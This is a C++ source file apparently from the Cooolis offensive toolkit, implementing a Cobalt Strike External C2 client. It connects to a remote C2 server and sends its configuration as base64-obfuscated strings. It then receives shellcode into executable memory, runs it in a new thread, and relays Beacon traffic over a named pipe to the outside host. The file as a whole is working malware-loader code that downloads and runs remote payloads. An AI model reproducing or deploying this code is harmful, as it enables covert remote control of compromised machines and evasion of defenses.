#include "Cooolis-ExternalC2.h"

DWORD CCooolisExternalC2::read_frame(HANDLE my_handle, char* buffer, DWORD max)
{
    DWORD size = 0, temp = 0, total = 0;

    /* read the 4-byte length */
    ReadFile(my_handle, (char*)&size, 4, &temp, NULL);

    /* read the whole thing in */
    while (total < size) {
        ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
        total += temp;
    }

    return size;
}

void CCooolisExternalC2::write_frame(HANDLE my_handle, char* buffer, DWORD length)
{
    DWORD wrote = 0;
    WriteFile(my_handle, (void*)&length, 4, &wrote, NULL);
    WriteFile(my_handle, buffer, length, &wrote, NULL);
}

DWORD CCooolisExternalC2::recv_frame(SOCKET my_socket, char* buffer, DWORD max)
{
    DWORD size = 0, total = 0, temp = 0;

    /* read the 4-byte length */
    recv(my_socket, (char*)&size, 4, 0);

    /* read in the result */
    while (total < size) {
        temp = recv(my_socket, buffer + total, size - total, 0);
        total += temp;
    }

    return size;
}

void CCooolisExternalC2::send_frame(SOCKET my_socket, char* buffer, int length)
{
    send(my_socket, (char*)&length, 4, 0);
    send(my_socket, buffer, length, 0);
}

std::string CCooolisExternalC2::GetPipeName()
{
	GUID guid;
	::CoCreateGuid(&guid);
    const int len = 36;
    char dst[len];
    memset(dst, 0, len);
    snprintf(dst, len,
        "%08x%04x%04x%02x%02x%02x%02x%02x%02x%02x%02x",
        guid.Data1, guid.Data2, guid.Data3,
        guid.Data4[0], guid.Data4[1], guid.Data4[2],
        guid.Data4[3], guid.Data4[4], guid.Data4[5],
        guid.Data4[6], guid.Data4[7]);
    std::string out(dst);
	return std::move(out);
}

CCooolisExternalC2::CCooolisExternalC2()
{
    WSADATA wsaData;
    WORD    wVersionRequested;
    wVersionRequested = MAKEWORD(2, 2);
    WSAStartup(wVersionRequested, &wsaData);
    this->socket_extc2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
}

CCooolisExternalC2::~CCooolisExternalC2()
{
    if (this->socket_extc2)
        closesocket(this->socket_extc2);
}

BOOL CCooolisExternalC2::ConnectServer(std::string host, USHORT port)
{
    /* copy our target information into the address structure */
    struct sockaddr_in 	sock;
    sock.sin_family = AF_INET;
    sock.sin_addr.s_addr = inet_addr(host.c_str());
    sock.sin_port = htons(port);

    /* attempt to connect */
    this->socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(socket_extc2, (struct sockaddr*) & sock, sizeof(sock))) {
        return FALSE;
    }
    return TRUE;
}

BOOL CCooolisExternalC2::SendOptions()
{
    std::string pipename = CooolisString("cGlwZW5hbWU9");
    sPipeName = this->GetPipeName();
    pipename.append(sPipeName);
    std::string block = CooolisString("YmxvY2s9MTAw");
    std::string go = CooolisString("Z28=");
#ifdef _WIN64
    std::string arch = CooolisString("YXJjaD14NjQ=");
#else
    std::string arch = CooolisString("YXJjaD14ODY=");
#endif
    send_frame(socket_extc2, (PCHAR)arch.data(), 8);
    send_frame(socket_extc2, (PCHAR)pipename.data(), pipename.length());
    send_frame(socket_extc2, (PCHAR)block.data(), 9);
    send_frame(socket_extc2, (PCHAR)go.data(), 2);

    return TRUE;
}

BOOL CCooolisExternalC2::RecvPayload()
{
    payload = (PCHAR)CooolisVirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ZeroMemory(payload, PAYLOAD_MAX_SIZE);
    recv_frame(socket_extc2, payload, PAYLOAD_MAX_SIZE);

    return TRUE;
}

VOID CCooolisExternalC2::HandleBeacon()
{
   
    sPipeName.insert(0, CooolisString("XFwuXHBpcGVc"));
    this->hBeacon = INVALID_HANDLE_VALUE;
    
    CooolisCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID)NULL, 0, NULL);

    
    while (hBeacon == INVALID_HANDLE_VALUE) {
        Sleep(1000);
        hBeacon = CreateFileA(sPipeName.c_str(), GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
    }

    

    /* setup our buffer */
    char* buffer = (char*)malloc(BUFFER_MAX_SIZE); /* 1MB should do */

    /*
     * relay frames back and forth
     */
    while (TRUE) {
        /* read from our named pipe Beacon */
        DWORD read = read_frame(hBeacon, buffer, BUFFER_MAX_SIZE);
        if (read < 0) {
            break;
        }

        /* write to the External C2 server */
        send_frame(socket_extc2, buffer, read);

        /* read from the External C2 server */
        read = recv_frame(socket_extc2, buffer, BUFFER_MAX_SIZE);
        if (read < 0) {
            break;
        }

        /* write to our named pipe Beacon */
        write_frame(hBeacon, buffer, read);
    }

    return VOID();
}
